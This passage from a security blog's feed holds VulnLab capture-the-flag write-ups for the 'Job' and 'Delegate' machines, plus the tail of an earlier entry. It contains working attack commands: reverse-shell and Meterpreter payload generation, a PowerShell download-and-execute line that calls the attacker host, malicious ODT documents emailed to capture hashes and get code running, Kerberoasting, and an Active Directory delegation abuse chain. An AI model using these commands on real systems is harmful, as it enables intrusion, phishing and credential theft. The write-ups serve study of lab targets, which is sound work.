src="/images/Media/shell_in_website.png" alt="Shell in Website"></p><h2 id="Gaining-System-Access"><a href="#Gaining-System-Access" class="headerlink" title="Gaining System Access"></a>Gaining System Access</h2><p>I created a HoaxShell session and executed the provided command through our webshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --p 4444</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpshell.php?cmd=powershell -e ......</span><br></pre></td></tr></table></figure><p><img src="/images/Media/hoaxshell.png" alt="HoaxShell Connection"><br>I noticed we were running as the Local Service account but without the impersonate privilege. To restore these privileges, I used <a href="https://github.com/itm4n/FullPowers/releases/tag/v0.1">FullPowers</a>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.8.5.195/FullPowers.exe -o FS.exe</span><br></pre></td></tr></table></figure><p>I then created another HoaxShell and executed FullPowers:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./FS.exe -c &quot;powershell -e .....</span><br></pre></td></tr></table></figure><p><img src="/images/Media/seimpersonate.png" alt="SeImpersonate Privilege"></p><h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p>To escalate to SYSTEM, I used the Meterpreter <code>getsystem</code> command (alternatively, any potato exploit would work):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure><p>Started Metasploit console:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 9091</span><br></pre></td></tr></table></figure><p>After obtaining a system session, I simply ran:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><p><img src="/images/Media/systemshell.png" alt="System Shell"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c">https://api.vulnlab.com/api/v1/share?id=396c14c2-aa9d-46a2-a792-68ceea4b179c</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Job</title>
      <link href="/2025/04/02/VL-Job/"/>
      <url>/2025/04/02/VL-Job/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><p>Initial port scan revealed several open ports:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Job.local</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br></pre></td></tr></table></figure><h2 id="Vulnerability-Discovery"><a href="#Vulnerability-Discovery" class="headerlink" title="Vulnerability Discovery"></a>Vulnerability Discovery</h2><p>After noticing the IIS server, I decided to check for the IIS short name vulnerability using a specialized scanning tool:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar iis_shortname_scanner.jar 2 20 http://10.10.94.31/</span><br></pre></td></tr></table></figure><p>The scan revealed the server is vulnerable and identified some files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Scanning...</span><br><span class="line"></span><br><span class="line">Testing request method: &quot;OPTIONS&quot; with magic part: &quot;/~1/.rem&quot; ...</span><br><span class="line">Early result: the target is probably vulnerable.</span><br><span class="line">Early result: identified letters in names &gt; A,D,E,H,I,L,N,O,P,S,T,X</span><br><span class="line">Early result: identified letters in extensions &gt; A,H,M,P,S,T</span><br><span class="line">File: HELLO~1.ASP</span><br><span class="line">Dir: ASPNET~1</span><br><span class="line">File: INDEX~1.HTM</span><br><span class="line">[\] INDEX~1.HTT</span><br><span class="line"># IIS Short Name (8.3) Scanner version 2023.4 - scan initiated 2025/04/02 17:40:37</span><br><span class="line">Target: http://10.10.94.31/</span><br><span class="line">|_ Result: Vulnerable!</span><br><span class="line">|_ Used HTTP method: OPTIONS</span><br><span class="line">|_ Suffix (magic part): /~1/.rem</span><br><span class="line">|_ Extra information:</span><br><span class="line">  |_ Number of sent requests: 444</span><br><span class="line">  |_ Identified directories: 1</span><br><span class="line">    |_ ASPNET~1</span><br><span class="line">  |_ Identified files: 2</span><br><span class="line">    |_ HELLO~1.ASP</span><br><span class="line">      |_ Actual file name = HELLO</span><br><span class="line">    |_ INDEX~1.HTM</span><br><span class="line">      |_ Actual file name = INDEX</span><br></pre></td></tr></table></figure><p>Using the discovered information, I accessed the HELLO.ASPX file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.94.31/HELLO.ASPX             </span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;./HELLO.ASPX&quot; id=&quot;form1&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATE&quot; id=&quot;__VIEWSTATE&quot; value=&quot;/wEPDwUKLTg0NTYxMzIxNWRksO0e53iBgOk1F32mZVsjTztyPJmhrJc1OInj8vzB5Gk=&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;__VIEWSTATEGENERATOR&quot; id=&quot;__VIEWSTATEGENERATOR&quot; value=&quot;D4124C05&quot; /&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line"></span><br><span class="line">        Hello World</span><br><span class="line"></span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br></pre></td></tr></table></figure><p>I discovered a message on the website stating: “Please send your application to <a href="mailto:&#99;&#x61;&#114;&#x65;&#101;&#114;&#64;&#x6a;&#111;&#98;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;">&#99;&#x61;&#114;&#x65;&#101;&#114;&#64;&#x6a;&#111;&#98;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a>! We recently switched to using open source products - please send your cv as a libre office document.”</p><h2 id="Initial-Access-Strategy"><a href="#Initial-Access-Strategy" class="headerlink" title="Initial Access Strategy"></a>Initial Access Strategy</h2><p>This presented an opportunity for exploitation through malicious ODT files. I decided to use Metasploit’s ODT template:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use fileformat/odt_badodt</span><br></pre></td></tr></table></figure><p>To capture hashes, I set up Responder:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p>Then sent a malicious ODT file via email:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swaks --to career@job.local --from fake@example.com --server 10.10.94.31 --attach @/root/.msf4/local/bad.odt --header &quot;Application&quot; --body &quot;Hello i am a softwere developer and I would like to apply for the job&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/Job/foothold.png" alt="Successfully obtained a user hash"><br>After capturing the hash, I attempted to crack it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash9099.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat                                </span><br><span class="line">Status...........: Exhausted</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: JACK.BLACK::JOB:16c1cb50aabefdf2:b4ad21b5ac50c9dc89...000000</span><br><span class="line">Time.Started.....: Wed Apr  2 18:41:19 2025 (7 secs)</span><br><span class="line">Time.Estimated...: Wed Apr  2 18:41:26 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:  2066.3 kH/s (1.50ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)</span><br><span class="line">Progress.........: 14344385/14344385 (100.00%)</span><br><span class="line">Rejected.........: 0/14344385 (0.00%)</span><br><span class="line">Restore.Point....: 14344385/14344385 (100.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: $HEX[206b72697374656e616e6e65] -&gt; $HEX[042a0337c2a156616d6f732103]</span><br><span class="line">Hardware.Mon.#1..: Temp: 66c Util: 69%</span><br></pre></td></tr></table></figure><p>Unfortunately, the hash cracking attempt was unsuccessful.</p><h2 id="Alternative-Approach-Macro-Exploitation"><a href="#Alternative-Approach-Macro-Exploitation" class="headerlink" title="Alternative Approach - Macro Exploitation"></a>Alternative Approach - Macro Exploitation</h2><p>I decided to create a malicious LibreOffice macro:<br><img src="/images/Job/macro1.png" alt="Macro creation part 1"><br><img src="/images/Job/macro2.png" alt="Macro creation part 2"><br><img src="/images/Job/marco3.png" alt="Macro creation part 3"><br><img src="/images/Job/macro4.png" alt="Macro creation part 4"><br><img src="/images/Job/marco4.png" alt="Macro creation part 5"></p><h2 id="Getting-a-Shell"><a href="#Getting-a-Shell" class="headerlink" title="Getting a Shell"></a>Getting a Shell</h2><p>I set up a HoaxShell listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --p 4444</span><br></pre></td></tr></table></figure><p><img src="/images/Job/hoaxhsell.png" alt="HoaxShell listener ready"></p><p>Alternatively, we can create a DSVyper shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f raw -o shell.bin</span><br></pre></td></tr></table></figure><p><img src="/images/Job/dsvyper.png" alt="DSVyper shell creation"><br>For the macro, we’d use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(IWR http://10.8.5.195/shell.exe -UseBasicParsing);</span><br></pre></td></tr></table></figure><p>I sent the email with the malicious ODT file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swaks --to career@job.local --header &quot;Application CV&quot; --body &quot;Hello, I&#x27;m a software developer and i am searching for a job, please review my application.&quot; --attach @hello.odt --server 10.10.94.31</span><br></pre></td></tr></table></figure><p><img src="/images/Job/shellback2.png" alt="Successful shell callback"></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>I attempted reconnaissance using PowerUp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\jack.black\Desktop &gt; curl http://10.8.5.195/PowerUp.ps1 -o PowerUp.ps1</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; dir</span><br><span class="line">Directory: C:\Users\jack.black\Desktop</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; Import-Module ./PowerUp.ps1</span><br><span class="line">PS C:\Users\jack.black\Desktop &gt; Invoke-AllChecks</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Results showed:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HijackablePath : C:\Users\jack.black\AppData\Local\Microsoft\WindowsApps\                                                                                                                                                                   </span><br><span class="line">AbuseFunction  : Write-HijackDll -OutputFile &#x27;C:\Users\jack.black\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll&#x27;          </span><br><span class="line">-Command &#x27;...&#x27; </span><br></pre></td></tr></table></figure><p>This approach didn’t yield results.<br>I noticed that user jack.black is in the developers group, which meant we could modify the webpage. I placed a webshell in the <code>wwwroot</code> folder:<br><img src="/images/Job/webshell.png" alt="Webshell creation"><br><img src="/images/Job/web-shell.png" alt="Web shell in action"><br>Set up another HoaxShell listener:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hoaxshell -s 10.8.5.195 --port 4433</span><br></pre></td></tr></table></figure><p>I pasted the HoaxShell command and got a new shell:<br><img src="/images/Job/impersonate.png" alt="Impersonating as web service"></p><h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>For obtaining full system access, I generated a Meterpreter payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.8.5.195 LPORT=9091 -f exe -o shell2.exe</span><br></pre></td></tr></table></figure><p>I uploaded the payload and set up a multi&#x2F;handler:<br><img src="/images/Job/mulit-handler.png" alt="Meterpreter multi/handler setup"><br>With the Meterpreter session established, I was able to escalate to SYSTEM:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1828 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.20348.350]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\inetpub\wwwroot&gt;</span><br></pre></td></tr></table></figure><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The Job machine was successfully compromised by exploiting:</p><ol><li>A vulnerability in how the server processes LibreOffice documents</li><li>Web server write permissions available to the compromised user</li><li>Service impersonation techniques for privilege escalation</li></ol><p><a href="https://api.vulnlab.com/api/v1/share?id=4fcb82b4-05e4-4b83-ac24-42fdc137a063">https://api.vulnlab.com/api/v1/share?id=4fcb82b4-05e4-4b83-ac24-42fdc137a063</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Delegate</title>
      <link href="/2025/04/02/VL-Delegate/"/>
      <url>/2025/04/02/VL-Delegate/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 65510 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server </span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">|_ssl-date: 2025-04-01T16:43:27+00:00; -1h59m53s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC1.delegate.vl</span><br><span class="line">| Issuer: commonName=DC1.delegate.vl</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">49664/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49665/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49667/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49669/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49672/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49683/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49685/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64567/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">64591/tcp open  unknown       syn-ack ttl 127</span><br></pre></td></tr></table></figure><h2 id="SMB-Enumeration"><a href="#SMB-Enumeration" class="headerlink" title="SMB Enumeration"></a>SMB Enumeration</h2><p>We can get access to the SMB server via a null session:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.64.93 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/smb_guest.png" alt="SMB Guest Access"></p><p>After gaining access to the NETLOGON share, we find a <code>users.bat</code> file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.64.93/NETLOGON</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get users.bat</span><br></pre></td></tr></table></figure><p>Opening that file reveals credentials for what appears to be an Administrator account, as the command will run when the username is A.Briggs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings users.bat</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/strings.png" alt="Strings Output"></p><p>The password didn’t work for Administrator but worked for A.Briggs. This gave us access to LDAP, so the next step was running BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb delegate.vl -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/foothold.png" alt="Initial Foothold"></p><h2 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h2><p>After analyzing the domain structure, we discovered that we have GenericWrite permissions over N.Thompson, who also has PSRemote access to the Domain Controller - a promising attack path:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.64.93 -u &#x27;A.Briggs&#x27; -p &#x27;&#x27; --bloodhound --dns-server 10.10.64.93 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/path.png" alt="Attack Path"></p><h3 id="Exploiting-GenericWrite"><a href="#Exploiting-GenericWrite" class="headerlink" title="Exploiting GenericWrite"></a>Exploiting GenericWrite</h3><p>We abused the GenericWrite permissions using targeted Kerberoasting to obtain N.Thompson’s hash and crack the password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 targetedKerberoast.py -v -d &#x27;delegate.vl&#x27; -u &#x27;a.briggs&#x27; -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/delegate.png" alt="Kerberoast Results"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash9090.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/cracked_hash.png" alt="Cracked Hash"></p><p>Now we could connect to the machine using WinRM and retrieve the user flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.64.93 -u N.Thompson -p KALEB_2341</span><br></pre></td></tr></table></figure><h2 id="Unconstrained-Delegation-Exploitation"><a href="#Unconstrained-Delegation-Exploitation" class="headerlink" title="Unconstrained Delegation Exploitation"></a>Unconstrained Delegation Exploitation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/delegation_priv.png" alt="Delegation Privileges"></p><p>According to <a href="https://blog.harmj0y.net/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/">HarmJ0y’s blog</a>, this GPO is located at <strong>\DOMAIN\sysvol\testlab.local\Policies{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</strong>. By adding any user SID or username to the <strong>SeEnableDelegationPrivilege</strong> line of the <strong>[Privilege Rights]</strong> section, the setting will take hold whenever the user&#x2F;machine’s current DC reboots or refreshes its group policy.</p><p>This means we can abuse unconstrained delegation by creating a machine account and appending a Service Principal Name (SPN) to it. First, we need to check if the machine quota isn’t set to 0:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap delegate.vl -u N.Thompson -p  -M maq</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/machine_acc.png" alt="Machine Account Quota"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addcomputer -dc-ip 10.10.64.93 -computer-pass HelloWorld123 -computer-name Evil delegate.vl/N.Thompson:&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>Next, we add a DNS record for the machine account we created using <a href="https://github.com/dirkjanm/krbrelayx/tree/master">krbrelayx</a>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dnstool.py -u &#x27;delegate.vl\Evil$&#x27; -p HelloWorld123 -r Evil.delegate.vl -d 10.8.5.195 --action add DC1.delegate.vl -dns-ip 10.10.64.93</span><br></pre></td></tr></table></figure><p>To abuse unconstrained delegation, the machine account needs to have an SPN and <code>TRUSTED_FOR_DELEGATION</code> UAC. We can add the UAC using <code>bloodyAD</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC1.delegate.vl -u &#x27;N.Thompson&#x27; -p &#x27;&#x27; -d &#x27;delegate.vl&#x27; add uac &#x27;Evil$&#x27; -f TRUSTED_FOR_DELEGATION</span><br></pre></td></tr></table></figure><p>Now we append an SPN with <code>addspn</code> via <code>msDS-AdditionalDnsHostName</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 addspn.py -u delegate\\N.Thompson -p &#x27;KALEB_2341&#x27; -s CIFS/Evil.delegate.vl -q dc1.delegate.vl -t &#x27;Evil$&#x27; -dc-ip 10.10.64.93</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[+] Found modification target</span><br><span class="line">DN: CN=Evil,CN=Computers,DC=delegate,DC=vl - STATUS: Read - READ TIME: 2025-04-01T20:40:40.003792</span><br><span class="line">    msDS-AdditionalDnsHostName: Evil.delegate.vl</span><br><span class="line">    sAMAccountName: Evil$</span><br><span class="line">    servicePrincipalName: cifs/Evil.delegate.vl</span><br></pre></td></tr></table></figure><p>Additionally, we’ll add a HOST SPN on the machine we’ve 